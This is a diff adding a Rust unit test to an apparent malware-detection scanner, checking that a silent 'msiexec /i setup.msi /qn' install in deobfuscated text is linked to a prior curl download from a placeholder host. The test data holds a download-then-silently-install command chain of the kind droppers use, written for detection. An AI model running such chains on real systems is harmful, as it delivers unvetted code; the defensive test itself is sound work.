@@ -15527,6 +15527,29 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     }
 
     #[test]
+    fn msiexec_downloaded_package_in_deob_text_resolves_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::Download {
+            cmd: "curl -o setup.msi https://msiexec-deob-local.example/setup.msi".to_string(),
+            src: "https://msiexec-deob-local.example/setup.msi".to_string(),
+            dst: Some("setup.msi".to_string()),
+        });
+        crate::deob_scan::scan_deob_text("msiexec /i setup.msi /qn", &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "msiexec /i setup.msi /qn"
+                            && url == "https://msiexec-deob-local.example/setup.msi"
+                )
+            }),
+            "msiexec downloaded package in deob text was not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn certreq_config_url_in_deob_text_emits_typed_trait() {
         let mut env = crate::env::Environment::new(&Config::default());
         let url = "https://certreq-deob.example/submit";
